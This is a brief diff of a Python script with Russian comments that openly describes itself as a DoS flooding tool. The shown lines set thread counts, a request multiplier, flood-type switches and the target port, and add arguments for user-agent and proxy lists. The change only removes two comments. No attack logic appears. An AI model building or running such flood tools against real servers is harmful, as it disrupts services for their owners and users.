@@ -20,13 +20,12 @@ useragents = []
 ##Мощность DoS-а зависит от вашего интернет соеденения!!!
 multiple = 100 # Умножение, значение можно менять
 threads = 922 # Кол-во потоков, можно менять
-choice1 = 0 #Для настройки типа флуда
+choice1 = 0 
 choice2 = 0 #Для настройки типа флуда
 choice3 = 0 #Для настройки типа флуда
 port = 80 # Порт куда будут слаться заросы, можно менять
 
 
-##### Добавляем в программу аргументы
 parser = argparse.ArgumentParser()
 parser.add_argument('-useragent', help = 'Путь до файла с user-агентами')
 parser.add_argument('-proxylist', help = 'Путь до файла с proxy')
